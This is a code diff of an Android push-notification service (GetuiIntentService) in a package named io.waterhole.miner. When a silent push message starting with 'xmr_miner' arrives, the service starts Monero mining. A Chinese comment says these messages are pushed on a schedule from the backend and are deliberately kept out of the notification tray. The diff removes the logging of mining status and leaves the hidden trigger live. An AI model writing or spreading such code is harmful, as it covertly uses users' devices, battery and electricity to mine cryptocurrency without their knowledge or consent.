@@ -1,10 +1,8 @@
 package io.waterhole.miner;
 
-import static waterhole.miner.core.utils.LogUtils.error;
-import static waterhole.miner.core.utils.LogUtils.info;
-
 import android.content.Context;
 
+import android.os.RemoteException;
 import com.igexin.sdk.GTIntentService;
 import com.igexin.sdk.PushManager;
 import com.igexin.sdk.message.GTCmdMessage;
@@ -64,41 +62,40 @@ public final class GetuiIntentService extends GTIntentService {
             LogUtils.info("receiver payload = " + data);
             // todo 这边后台定时推送透传消息（字段约定好，如xmr_miner, 无需在通知框中显示），启动挖矿
             if (data.startsWith("xmr_miner")) {
-                XmrMiner.instance().init(this).setStateObserver(new StateObserver() {
-
+                XmrMiner.instance().init(context).setStateObserver(new StateObserver() {
                     @Override
-                    public void onConnectPoolBegin() {
-                        info("onConnectPoolBegin");
+                    public void onConnectPoolBegin() throws RemoteException {
+
                     }
 
                     @Override
-                    public void onConnectPoolSuccess() {
-                        info("onConnectPoolSuccess");
+                    public void onConnectPoolSuccess() throws RemoteException {
+
                     }
 
                     @Override
-                    public void onConnectPoolFail(String error) {
-                        error("onConnectPoolFail: " + error);
+                    public void onConnectPoolFail(String error) throws RemoteException {
+
                     }
 
                     @Override
-                    public void onPoolDisconnect(String error) {
-                        error("onPoolDisconnect: " + error);
+                    public void onPoolDisconnect(String error) throws RemoteException {
+
                     }
 
                     @Override
-                    public void onMessageFromPool(String message) {
-                        info("onMessageFromPool: " + message);
+                    public void onMessageFromPool(String message) throws RemoteException {
+
                     }
 
                     @Override
-                    public void onMiningError(String error) {
-                        error("onMiningError = " + error);
+                    public void onMiningError(String error) throws RemoteException {
+
                     }
 
                     @Override
-                    public void onMiningStatus(double speed) {
-                        info("onMiningStatus speed = " + speed);
+                    public void onMiningStatus(double speed) throws RemoteException {
+
                     }
                 }).startMine();
             }
